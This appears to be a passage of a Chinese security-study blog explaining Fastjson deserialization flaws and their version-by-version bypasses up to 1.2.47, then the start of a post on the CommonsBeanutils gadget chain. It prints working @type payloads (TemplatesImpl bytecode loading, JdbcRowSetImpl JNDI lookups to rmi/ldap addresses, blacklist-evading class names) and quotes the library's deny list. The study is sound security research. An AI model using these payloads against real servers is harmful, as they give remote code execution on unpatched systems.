id + &#39;&#125;&#39;; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name &#x3D; name; &#125; public int getId() &#123; return id; &#125; public void setId(int id) &#123; System.out.println(&quot;setId&quot;); this.id &#x3D; id; &#125; &#125; 然后可以使用JSON的toJSONString方法 将对象转换为字符串 但是这样得到的json格式的字符串只有属性的内容，不能区分出属于哪一个类，因此toJSONString方法还有第二个参数SerializerFeature.WriteClassName 传入SerializerFeature.WriteClassName可以使得Fastjson支持自省，开启自省后序列化成JSON的数据就会多一个@type，这个是代表对象类型的JSON文本。 这时的json中就有@type这个键，其值就是转换为json字符串的Java类 当然也可以把JSON 字符串转换为 Java 对象 使用JSON.parse或者JSON.parseObject可以把JSON 字符串转换为 Java 对象 JSON.parseObject方法中没指定对象，返回的则是JSONObject的对象。JSON.parseObject和 JSON.parse这两个方法差不多，JSON.parseObject的底层调用的还是JSON.parse方法，只是在JSON.parse的基础上做了一个封装。 这种把对象转化为json字符串，再把字符串转换为java对象的过程其实也是一种序列化和反序列化 在序列化时，FastJson会调用成员对应的get方法，被private修饰且没有get方法的成员不会被序列化， 而反序列化的时候在，会调用了指定类的全部的setter，publibc修饰的成员全部赋值。 Fastjson1.2.24 版本漏洞复现漏洞是利用fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。 漏洞攻击方式@type 指定类使用JSON.parse方法反序列化会调用此类的set方法使用JSON.parseObject方法反序列化会调用此类get和set方法可以写一个恶意类，然后通过这一特性实现命令执行 漏洞复现parseObject流程在正式复现漏洞之前，先看看parseObject的执行流程 首先就能看出来parseObject其实就是调了一个parse然后进行了强制类型转换 TemplatesImpl链版本：fastjson &lt;= 1.2.24 说明：借助TemplatesImpl类实现漏洞利用 这个类在CC链和CB链里都出现过，这里就是用了CB的那条从getOutputProperties到defineClass的路 先试试能不能到getOutputProperties，因为只有JSON.parseObject才能调用属性的get方法，所有这里只能用JSON.parseObject，而且因为fastjson处理的时候会去掉下划线，所以这个getOutputProperties方法对应的就是_outputProperties属性 证明确实能过来，所以后边就简单多了，就是满足一些条件，让它能最终加载恶意字节码 找找加载字节码的路上有哪些if判断，首先是_name不能为空，_class为空 然后是_bytecodes不能为空 _tfactory也不能空 最后就是加载的字节码内容是_bytecodes里的 这里_outputProperties和_tfactory是HashMap类型的成员变量，所以可以赋值成一个空的hashmap，然后_name随便赋个字符串类型的值，_bytecodes是数组类型的值，这里我们先不纠结_bytecodes里的内容，先把链子跑通再说 Fastjson默认只会反序列化public修饰的属性，因此由于outputProperties和_bytecodes由private修饰，必须加入Feature.SupportNonPublicField在parseObject中才能触发； 构造好的测试payload为 String text &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\&quot;,\\&quot;_name\\&quot;:\\&quot;a\\&quot;,\\&quot;_tfactory\\&quot;:&#123;&#125;,\\&quot;_bytecodes\\&quot;:[\\&quot;1111111\\&quot;],\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;&quot;; 这里一定要注意顺序，因为我们要的是给所有的属性赋值完后再去执行反序列化链，因此_outputProperties必须放在最后面 调试一下发现已经走到defineClass里了，但是字节数组里没有值 这就是我们之前说的fastjson 在反序列化时，如果 Field 类型为 byte[]，将会调用com.alibaba.fastjson.parser.JSONScanner#bytesValue 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。 因为单纯的一个字符解不出来东西，导致出来的字节数组是空的 这也意味着我们要加载的恶意字节码必须经过base64加密后再传进去 这里就直接用cc3的时候的恶意字节码文件，然后对其进行base64加密 import java.io.ByteArrayOutputStream; import java.io.FileInputStream; import java.util.Base64; import java.util.Base64.Encoder; public class base &#123; public static void main(String args[]) &#123; byte[] buffer &#x3D; null; String filepath &#x3D; &quot;src&#x2F;main&#x2F;java&#x2F;loadclass&#x2F;cmd.class&quot;; try &#123; FileInputStream fis &#x3D; new FileInputStream(filepath); ByteArrayOutputStream bos &#x3D; new ByteArrayOutputStream(); byte[] b &#x3D; new byte[1024]; int n; while((n &#x3D; fis.read(b))!&#x3D;-1) &#123; bos.write(b,0,n); &#125; fis.close(); bos.close(); buffer &#x3D; bos.toByteArray(); &#125;catch(Exception e) &#123; e.printStackTrace(); &#125; Encoder encoder &#x3D; Base64.getEncoder(); String value &#x3D; encoder.encodeToString(buffer); System.out.println(value); &#125; &#125; 把得到的base64的结果放进_bytecodes里 执行即可 总结 其实主要都是CB链的部分，大部分内容在前边也都讲过了 JdbcRowSetImpl 链这个就是基于JNDI注入的攻击方式，也是最常用的一种 和JNDI一样，有两种，一种是和RMI一起，另一种是和LDAP一起 1. JNDI + RMI在JdbcRowSetImpl这个类里，有这么一个set方法 设置数据库源 里面调用了父类的setDataSourceName方法 这里面若name为空，则会对dataSource赋值，这个值我们可控。 然后再看JdbcRowSetImpl类里的setAutoCommit 当conn为空时，会进入connect方法 一个lookup方法，一个可控的url，完美的jndi注入点 而且这个conn在构造方法里，默认就是null 然后就可以构造一下payload了 &#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;DataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;,&quot;autoCommit&quot;:true&#125; 再起一个基于rmi的JNDI服务端端 2. JNDI + LDAP就改个url，其他的和RMI的一样 贴个调用链，方便后边对比 Fastjson坎坷曲折的一生自1.2.24版本出现了Fastjson的反序列化漏洞后，在之后几个版本，阿里不断的在对漏洞点进行修补，而安全研究者们也在不断的寻找绕过的手段（这真是，泰裤辣！ 1.2.25-1.2.41修复在这个版本中，fastjson增加了黑名单而且设置了一个autoTypeSupport用来控制是否可以反序列化，autoTypeSupport默认为false且禁止反序列化，为true时会使用checkAutoType来进行安全检测 是在DefaultJSONParser.parseObject()里用的 1.2.24版本： 1.2.25版本： 跟进这个checkAutoType看看 public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123; if (typeName &#x3D;&#x3D; null) &#123; return null; &#125; final String className &#x3D; typeName.replace(&#39;$&#39;, &#39;.&#39;); &#x2F;&#x2F; autoTypeSupport默认为False &#x2F;&#x2F; 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤 if (autoTypeSupport || expectClass !&#x3D; null) &#123; for (int i &#x3D; 0; i &lt; acceptList.length; ++i) &#123; String accept &#x3D; acceptList[i]; if (className.startsWith(accept)) &#123; return TypeUtils.loadClass(typeName, defaultClassLoader); &#125; &#125; for (int i &#x3D; 0; i &lt; denyList.length; ++i) &#123; String deny &#x3D; denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; &#125; &#125; &#x2F;&#x2F; 从Map缓存中获取类，注意这是后面版本的漏洞点 Class&lt;?&gt; clazz &#x3D; TypeUtils.getClassFromMapping(typeName); if (clazz &#x3D;&#x3D; null) &#123; clazz &#x3D; deserializers.findClass(typeName); &#125; if (clazz !&#x3D; null) &#123; if (expectClass !&#x3D; null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName()); &#125; return clazz; &#125; &#x2F;&#x2F; 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错 if (!autoTypeSupport) &#123; for (int i &#x3D; 0; i &lt; denyList.length; ++i) &#123; String deny &#x3D; denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; &#125; for (int i &#x3D; 0; i &lt; acceptList.length; ++i) &#123; String accept &#x3D; acceptList[i]; if (className.startsWith(accept)) &#123; clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader); if (expectClass !&#x3D; null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName()); &#125; return clazz; &#125; &#125; &#125; if (autoTypeSupport || expectClass !&#x3D; null) &#123; clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader); &#125; if (clazz !&#x3D; null) &#123; if (ClassLoader.class.isAssignableFrom(clazz) &#x2F;&#x2F; classloader is danger || DataSource.class.isAssignableFrom(clazz) &#x2F;&#x2F; dataSource can load jdbc driver ) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; if (expectClass !&#x3D; null) &#123; if (expectClass.isAssignableFrom(clazz)) &#123; return clazz; &#125; else &#123; throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName()); &#125; &#125; &#125; if (!autoTypeSupport) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; return clazz; &#125; 简单地说，checkAutoType()函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空） &#x2F;&#x2F;denyList bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework 这里因为黑名单中包含了”com.sun.”，所以就把我们前面的几个利用链都给过滤了 先在如果还是用之前的payload会报错 autoType is not support. com.sun.rowset.JdbcRowSetImpl 绕过绕过的前提是autoTypeSupport开启，在这种情况下 调用checkAutoType后，会先进行这个if判断 也就是先找白名单，找到直接加载，找不到就去找黑名单，找到直接报错。 假设都没找到，在后面也还是会加载类 所以只要想办法绕过第一个if里的对黑名单的检测就可以了 跟一下后面这个loadClass 会发现它在加载之前会对传进去的特定内容进行一个切割，对切割后的内容进行类加载 所以我们让com.sun.rowset.JdbcRowSetImpl以L开头，以；结尾 变为Lcom.sun.rowset.JdbcRowSetImpl; 这样既能绕过黑名单，又能实现类加载 poc为 public class text &#123; public static void main(String[] args) &#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); &#x2F;&#x2F;开启autoTypeSupport String poc &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\\&quot;,\\&quot;DataSourceName\\&quot;:\\&quot;ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F;a\\&quot;,\\&quot;autoCommit\\&quot;:true&#125;&quot;; JSON.parse(poc); &#125; &#125; 1.2.42修复在这个版本中，依旧用了黑白名单的方式，但是用hash的方式存的黑名单。应该是为了防止其他人根据这个去找绕过的路径 然后再checkAutoType方法里加了个这种东西。如果这个类名是以L开头和以;结尾的，就去掉第一个字符和最后一个字符再进行后面的判断 吐槽一下，这个if判断至于也要写成hash的形式吗，这截取的substring这么明显，而且截取的方式是不是有点太草率了 绕过双写 public class text &#123; public static void main(String[] args) &#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); &#x2F;&#x2F;开启autoTypeSupport String poc &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\\&quot;,\\&quot;DataSourceName\\&quot;:\\&quot;ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F;a\\&quot;,\\&quot;autoCommit\\&quot;:true&#125;&quot;; JSON.parse(poc); &#125; &#125; 1.2.43修复在checkAutoType里对传入的东西再加了一层判断，如果前两位是LL，那就直接报错 绕过在loadClass里除了对L开头；结尾的输入进行处理，还对[开头的输入也进行了截取，所以 [com.sun.rowset.JdbcRowSetImpl，通过这个方式可以过checkAutotype检测 但是这样会有个报错 这里就需要你在类路径后边加上[{，至于为什么还没怎么跟，原因就是 具体源码没跟，以后有空再说 1.2.44修复在checkAutoType中进行判断如果类名以[开始则直接抛出异常，由字符串处理导致的黑名单绕过也就告一段落了。 绕过这个版本没绕过，倒不是因为这个版本就没洞了，只不过是因为在之后版本发现的payload在这个版本也能用 1.2.45修复也不能叫修复吧，毕竟上个版本也没爆漏洞 增加了黑名单 绕过这里安全研究者将目光投向了组件身上 1.2.45的payload就是由mybatis导致的组件漏洞 先贴一个payload &#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;&#125;&#125; 由于org.apache.ibatis.datasource.jndi.JndiDataSourceFactory不在黑名单，所以能绕过checkAutoType的判断 然后按照Fastjson的特性，会去调用属性的set方法赋值 这个payload里有properties方法，理所当然的会去调用setProperties 又因为我们给properties赋的值的键是data_source 满足这个else if判断 这是里调用了lookup方法，而里边的getProperty方法就是获取data_source这个键对应的值 现在我们有了一个lookup方法，还有了个可控的url 就能实现jndi注入了 1.2.47修复没怎么找资料，大概也就是把org.apache.ibatis.datasource.jndi.JndiDataSourceFactory类也放黑名单里了之类的，这个版本重点在绕过 绕过自1.2.24漏洞修复后，我们的绕过都需要依赖AutoTypeSupport为true才能实现，这其实大大限制了我们的利用，而1.2.47版本出现的利用方式则解决了这一问题 这里出问题的还是负责安全检查的checkAutoType方法 public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123; &#x2F;&#x2F; 类名非空判断 if (typeName &#x3D;&#x3D; null) &#123; return null; &#125; &#x2F;&#x2F; 类名长度判断，不大于128不小于3 if (typeName.length() &gt;&#x3D; 128 || typeName.length() &lt; 3) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; String className &#x3D; typeName.replace(&#39;$&#39;, &#39;.&#39;); Class&lt;?&gt; clazz &#x3D; null; final long BASIC &#x3D; 0xcbf29ce484222325L; &#x2F;&#x2F;; final long PRIME &#x3D; 0x100000001b3L; &#x2F;&#x2F;L final long h1 &#x3D; (BASIC ^ className.charAt(0)) * PRIME; &#x2F;&#x2F; 类名以 [ 开头抛出异常 if (h1 &#x3D;&#x3D; 0xaf64164c86024f1aL) &#123; &#x2F;&#x2F; [ throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; &#x2F;&#x2F; 类名以 L 开头以 ; 结尾抛出异常 if ((h1 ^ className.charAt(className.length() - 1)) * PRIME &#x3D;&#x3D; 0x9198507b5af98f0L) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; final long h3 &#x3D; (((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME) ^ className.charAt(2)) * PRIME; &#x2F;&#x2F; autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项 if (autoTypeSupport || expectClass !&#x3D; null) &#123; long hash &#x3D; h3; for (int i &#x3D; 3; i &lt; className.length(); ++i) &#123; hash ^&#x3D; className.charAt(i); hash *&#x3D; PRIME; if (Arrays.binarySearch(acceptHashCodes, hash) &gt;&#x3D; 0) &#123; clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader, false); if (clazz !&#x3D; null) &#123; return clazz; &#125; &#125; &#x2F;&#x2F; 再对比 denyHashCodes 进行黑名单匹配 &#x2F;&#x2F; 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类 &#x2F;&#x2F; 则抛出异常 if (Arrays.binarySearch(denyHashCodes, hash) &gt;&#x3D; 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) &#x3D;&#x3D; null) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; &#125; &#125; &#x2F;&#x2F; 尝试在 TypeUtils.mappings 中查找缓存的 class if (clazz &#x3D;&#x3D; null) &#123; clazz &#x3D; TypeUtils.getClassFromMapping(typeName); &#125; &#x2F;&#x2F; 尝试在 deserializers 中查找这个类 if (clazz &#x3D;&#x3D; null) &#123; clazz &#x3D; deserializers.findClass(typeName); &#125; &#x2F;&#x2F; 如果找到了对应的 class，则会进行 return if (clazz !&#x3D; null) &#123; if (expectClass !&#x3D; null &amp;&amp; clazz !&#x3D; java.util.HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName()); &#125; return clazz; &#125; &#x2F;&#x2F; 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致 if (!autoTypeSupport) &#123; long hash &#x3D; h3; for (int i &#x3D; 3; i &lt; className.length(); ++i) &#123; char c &#x3D; className.charAt(i); hash ^&#x3D; c; hash *&#x3D; PRIME; if (Arrays.binarySearch(denyHashCodes, hash) &gt;&#x3D; 0) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; if (Arrays.binarySearch(acceptHashCodes, hash) &gt;&#x3D; 0) &#123; if (clazz &#x3D;&#x3D; null) &#123; clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader, false); &#125; if (expectClass !&#x3D; null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName()); &#125; return clazz; &#125; &#125; &#125; &#x2F;&#x2F; 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类 if (clazz &#x3D;&#x3D; null) &#123; clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader, false); &#125; if (clazz !&#x3D; null) &#123; if (TypeUtils.getAnnotation(clazz,JSONType.class) !&#x3D; null) &#123; return clazz; &#125; if (ClassLoader.class.isAssignableFrom(clazz) &#x2F;&#x2F; classloader is danger || DataSource.class.isAssignableFrom(clazz) &#x2F;&#x2F; dataSource can load jdbc driver ) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; if (expectClass !&#x3D; null) &#123; if (expectClass.isAssignableFrom(clazz)) &#123; return clazz; &#125; else &#123; throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName()); &#125; &#125; JavaBeanInfo beanInfo &#x3D; JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy); if (beanInfo.creatorConstructor !&#x3D; null &amp;&amp; autoTypeSupport) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; &#125; final int mask &#x3D; Feature.SupportAutoType.mask; boolean autoTypeSupport &#x3D; this.autoTypeSupport || (features &amp; mask) !&#x3D; 0 || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) !&#x3D; 0; if (!autoTypeSupport) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; return clazz; &#125; 这里其实有个问题 这块，如果开启了autoTypeSupport，fastjson还是会限制黑名单类的反序列化，但是前提是TypeUtils.mappings里没有缓存这个类，那假如缓存了，即使身处黑名单中的类，也可以继续被程序反序列化 而在 autoTypeSupport 为默认的 false 时，程序直接检查黑名单并抛出异常，在这部分我们无法绕过，所以必须想办法在当autoTypeSupport为false时执行的这个if判断前实现我们的攻击目的，或者退出checkAutoType方法 在这个if判断之前就这点代码 由于clazz初值是null，前面也没地方赋值，所以其实在这个if之前就俩if判断 假如在这里面能实现攻击那自然不用再管后面的程序，而如果能在这里面把clazz的值给赋上，那就能在判断autoTypeSupport是否为假的if判断前退出程序 先看 deserializers ，位于 com.alibaba.fastjson.parser.ParserConfig.deserializers ，是一个 IdentityHashMap，能向其中赋值的函数有： getDeserializer()：这个类用来加载一些特定类，以及有 JSONType 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。 initDeserializers()：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。 putDeserializer()：被前两个函数调用，我们无法控制入参。 因此我们无法向 deserializers 中写入值，也就在其中读出我们想要的恶意类。所以我们的目光转向了 TypeUtils.getClassFromMapping(typeName)。 这个方法从 TypeUtils.mappings 中取值，这是一个 ConcurrentHashMap 对象， 能向其中赋值的函数有： addBaseClassMappings()：无入参，加载 loadClass()：关键函数 public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123; &#x2F;&#x2F; 非空判断 if(className &#x3D;&#x3D; null || className.length() &#x3D;&#x3D; 0)&#123; return null; &#125; &#x2F;&#x2F; 防止重复添加 Class&lt;?&gt; clazz &#x3D; mappings.get(className); if(clazz !&#x3D; null)&#123; return clazz; &#125; &#x2F;&#x2F; 判断 className 是否以 [ 开头 if(className.charAt(0) &#x3D;&#x3D; &#39;[&#39;)&#123; Class&lt;?&gt; componentType &#x3D; loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); &#125; &#x2F;&#x2F; 判断 className 是否 L 开头 ; 结尾 if(className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;))&#123; String newClassName &#x3D; className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); &#125; try&#123; &#x2F;&#x2F; 如果 classLoader 非空，cache 为 true 则使用该类加载器加载并存入 mappings 中 if(classLoader !&#x3D; null)&#123; clazz &#x3D; classLoader.loadClass(className); if (cache) &#123; mappings.put(className, clazz); &#125; return clazz; &#125; &#125; catch(Throwable e)&#123; e.printStackTrace(); &#x2F;&#x2F; skip &#125; &#x2F;&#x2F; 如果失败，或没有指定 ClassLoader ，则使用当前线程的 contextClassLoader 来加载类，也需要 cache 为 true 才能写入 mappings 中 try&#123; ClassLoader contextClassLoader &#x3D; Thread.currentThread().getContextClassLoader(); if(contextClassLoader !&#x3D; null &amp;&amp; contextClassLoader !&#x3D; classLoader)&#123; clazz &#x3D; contextClassLoader.loadClass(className); if (cache) &#123; mappings.put(className, clazz); &#125; return clazz; &#125; &#125; catch(Throwable e)&#123; &#x2F;&#x2F; skip &#125; &#x2F;&#x2F; 如果还是失败，则使用 Class.forName 来获取 class 对象并放入 mappings 中 try&#123; clazz &#x3D; Class.forName(className); mappings.put(className, clazz); return clazz; &#125; catch(Throwable e)&#123; &#x2F;&#x2F; skip &#125; return clazz; &#125; 所以可以通过控制传参实现在mapping里放入任意的类 这个loadClass有三个重载 我们的目标就是调用第三个，而从一或者从二都能到第三个。 因为第三个只在checkAutoType里和第二个loadClass里调用 所以这个没戏了 然后这里重点看一下两个参数的loadClass 进deserialze里看一眼 这个类是用来处理一些乱七八糟类的反序列化类，其中就包括 Class.class 类，可以当我们加载恶意字节码的入口。 如果这个类是Class.class类型，就调用我们的loadClass 再看一下loadClass的参数 是可控的。只需要parser.resolveStatus 的值为TypeNameRedirect而且加载的是个Class.class类型的，就可以进入loadClass里 在loadClass里，他会把我们传入的类加进缓存里，所以如果我们的恶意payload有两部分，第一部分负责将恶意类假如缓存，第二部分就可以绕过黑名单的检查去执行命令 加入缓存的地方找到了，接下来简单说一下调用的过程和构造payload的时候的参数问题 调用MiscCodec#deserialze的地方在DefaultJSONParser#parseObject。在安全检查的后边，但是因为我们第一部分的payload肯定不会触发安全检查的报错，也就是说MiscCodec#deserialze一定会被触发 这个clazz就是@type的值，然后由于MiscCodec#deserialze里有 所以想要进缓存的类的键必须为val 我们可以编写 第一部分的payload了 &#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125; 后边就没啥说的了，因为绕过了安全检查，所以第二部分用之前JdbcRowSetImpl链的payload就行 完整payload String poc &#x3D; &quot;&#123;&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;&#125;,&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;DataSourceName\\&quot;:\\&quot;ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F;a\\&quot;,\\&quot;autoCommit\\&quot;:true&#125;&#125;&quot;; 小结这篇其实写的挺赶的，主要是先为了学会利用，所以没怎么细跟代码，而且有点错误在里边，比如1.2.47的payload的不受AutoTypeSupport影响的版本：其实是1.2.25 &lt;= fastjson &lt;= 1.2.32而受AutoTypeSupport影响版本有1.2.33 &lt;= fastjson &lt;= 1.2.47 具体原因还没看 还有就是关于高jdk版本绕过以及fastjson-1.2.68和fastjson结合原生反序列化利用的漏洞利用没写，等打完国赛或者过完期末再补吧 参考文章https://su18.org/post/fastjson/ https://tttang.com/archive/1579/ fastjson反序列化漏洞3-&lt;=1.2.47绕过_哔哩哔哩_bilibili FastJson与原生反序列化 | Y4tacker&#39;s Blog https://goodapple.top/archives/832 Fastjson反序列化漏洞(3)—历史版本绕过 – JohnFrod&#39;s Blog","categories":[],"tags":[]},{"title":"CommonsBeanutils反序列化","slug":"CommonsBeanutils反序列化","date":"2023-04-27T08:31:49.000Z","updated":"2023-05-25T08:31:46.851Z","comments":true,"path":"2023/04/27/CommonsBeanutils反序列化/","link":"","permalink":"https://ethe448.github.io/2023/04/27/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"本来是在学shiro 的，发现shiro无依赖反序列化需要用CB链，所以就先学一下CB链 前置知识commons-beanutils 是 Apache 提供的一个用于操作 JAVA bean 的工具包。里面提供了各种各样的工具类，让我们可以很方便的对 bean 对象的属性进行各种操作。 依赖&lt;dependency> &lt;groupId>commons-beanutils&lt;/groupId> artifactId>commons-beanutils&lt;/artifactId> &lt;version>1.9.2&lt;/version> &lt;/dependency> PropertyUtilsorg.apache.commons.beanutils.PropertyUtils 类使用 Java 反射 API 来调用 Java 对象上的通用属性 getter 和 setter 操作的实用方法。这些方法的具体使用逻辑其实是由 org.apache.commons.beanutils.PropertyUtilsBean 来实现的。 这个类有个共有静态方法 getProperty() ，接收两个参数 bean （类对象）和 name（属性名），方法会返回这个类的这个属性的值。其实就是用反射的方式调用这个JavaBean里的get方法 &#x2F;&#x2F;test.java package org.cb1; import org.apache.commons.beanutils.PropertyUtils; import java.lang.reflect.InvocationTargetException; public class test &#123; public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123; Object a &#x3D; PropertyUtils.getProperty(new javabean(), &quot;a&quot;); System.out.println(a); &#125; &#125; &#x2F;&#x2F;JavaBean package org.cb1; public class javabean &#123; private int a &#x3D; 22222; private String b &#x3D; &quot;aaa&quot;; public int getA() &#123; return a; &#125; public void setA(int a) &#123; this.a &#x3D; a; &#125; public String getB() &#123; return b; &#125; public void setB(String b) &#123; this.b &#x3D; b; &#125; &#125; BeanComparatorBeanComparator 是 commons-beanutils 提供的用来比较两个 JavaBean 是否相等的类，其实现了java.util.Comparator 接口。 BeanComparator 在初始化时可以指定 property 属性名称和 comparator 对比器，如果不指定，则默认是 ComparableComparator 。 BeanComparator 的 compare 方法接收两个对象，分别调用 PropertyUtils.getProperty() 方法获取两个对象的 property 属性的值，然后调用 internalCompare() 方法调用实例化时初始化的 comparator 的 compare 方法进行比较。 下个断点调试一下可以看见它最终还是调用了JavaBean里的getxx方法 调用链（有CC依赖TemplatesImpl类CB链的反序列化链借助了CC3里提到的TemplatesImpl，通过动态类加载机制来执行恶意代码 回忆一下CC3的TemplatesImpl部分 从newTransformer方法 进入getTransletInstance getTransletInstance还会有实例化的过程 然后再进入defineTransletClasses方法 在defineTransletClasses里调用了defineClass，实现加载类字节码并且实例化的目的 这就是CC3的利用 接下来让我们看看CB链里的利用 CB包里的调用之前我们说过，PropertyUtils类的getProperty方法会调用JavaBean里的get方式，去读取相应的属性值 传参方式是PropertyUtils.getProperty(Object bean,String name); 但是在调用的时候，并不会去判断我们传入的这个name属性是否存在，也就导致，我们可以利用这个方法去调用任意的以get开头的公共方法 巧的是TemplateImpl类里正好有一个这样的类，公共的、以get开头，而且还调用了newTransformer()，（巧了这不是 所以通过这个可以直接进CC3的链 然后要去找哪里调用了getProperty方法 这里是BeanComparator里的compare方法 很简单的逻辑，property可以在初始化的时候赋值 反序列化的实现这里又要涉及CC2的内容了 在CC2里，我们为了调用TransformingComparator的transform方法，从而调用TransformingComparator.transform方法找到了一条 在PriorityQueue类的siftDownUsingComparator方法调用compare的路线 虽然siftDownUsingComparator是私有的，但是在PriorityQueue类的readObject方法里调了heapify方法，heapify方法又调了siftDown，然后在siftDown里实现了对siftDownUsingComparator的调用 这条链在CB链里同样适用 唯一的问题就是在queue的赋值上 在CC2的时候，由于我们通过compare调用的是chainedTransformer，所以无论它的transform方法的参数输出的是什么，得到的都是我们设置的固定值，因此即使compare的两个参数都是空，也不会影响结果 而在CB链里，我们需要对compare的参数赋值， 从这里看出来o1和o2的值分别为x和c， 往前翻就能发现x的值就是heapify调siftDown的时候传的第二个参数 而c是在siftDownUsingComparator运算得到的 但其实根本上都是queue这个数组里边的内容 由于我们通过反射固定了size的值为2，所以这时候queue[i]其实就是queue[0] queue[child]就是queue[1] 所以用反射赋值就行了 Field queue &#x3D; objects.getClass().getDeclaredField(&quot;queue&quot;); queue.setAccessible(true); queue.set(objects,new Object[]&#123;templates,1&#125;); 另外，这里也有另一种赋值方式 Field field &#x3D; PriorityQueue.class.getDeclaredField(&quot;queue&quot;); field.setAccessible(true); Object[] objects &#x3D; (Object[]) field.get(queue); objects[0] &#x3D; tmpl; &#x2F;&#x2F;数组类型的值，通过反射的get方式得到的是一个引用类型的值，因此修改这个引用类型的值，也就相当于直接修改这个数组变量的值 这里只让一个值为TemplatesImpl对象实例的原因一是执行命令执行一次就够了，不过更主要的就是执行完命令后compare会抛出异常被catch捕捉，也执行不了第二个命令了。 问：既然只执行一次命令，那queue这个对象数组只赋值一个行不行 